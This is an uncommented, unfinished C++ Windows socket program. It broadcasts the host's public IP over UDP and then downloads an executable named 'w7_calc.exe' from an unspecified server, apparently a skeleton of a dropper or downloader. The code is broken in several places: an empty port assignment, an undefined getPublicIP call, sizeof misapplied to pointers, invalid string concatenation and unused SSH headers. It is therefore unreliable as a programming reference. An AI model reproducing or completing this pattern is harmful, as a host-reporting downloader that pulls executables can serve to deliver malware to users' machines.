#include<stdio.h>
#include<winsock2.h>
#include<ws2tcpip.h>
#include<libssh2.h>
#include<libssh2_sftp.h>
#include<winhttp.h>
#include<fstream>

void send_information(char* ip_address, char* message, int port){

	int udp_socket = socket(AF_INET, SOCK_DGRAM, 0);

	int broadcast = 1;

	setsockopt(udp_socket, SOL_SOCKET, SO_BROADCAST, (char*) &broadcast, sizeof(broadcast));

	sockaddr_in addr = {};
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = INADDR_ANY;

	sendto(udp_socket, message, sizeof(message), 0, (sockaddr*)&addr, sizeof(addr));

	close(udp_socket);

}

void get_file_information(char* ip_address, char* filename, int port){

	int server = socket(AF_INET, SOCK_STREAM, 0);

	sockaddr_in server_addr = {};
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	inet_pton(AF_INET, ip_address, &server_addr.sin_addr);

	connect(server, (sockaddr*)&server_addr, sizeof(server_addr));

	std::ofstream file(filename, std::ios::binary | std::ios::app);

	char buffer[1024];

	while(true){

		int incoming_length = recv(server, buffer, sizeof(buffer), 0);
		if (incoming_length <= 0){
			break;
		}

		file << buffer;

	}

}

int main(){

	WSADATA wsa;
	WSAStartup(MAKEWORD(2,2), &wsa);

	char* server_ip_address = getPublicIP();
	char* connected_ip_address = "";
	int port = ;
	std::string message = (char*) sizeof(server_ip_address) + server_ip_address + sizeof(int) + port;

	send_information(connected_ip_address, message, port);
	get_file_information(connected_ip_address, "w7_calc.exe", port);

	WSACleanup();

	return 0;
}
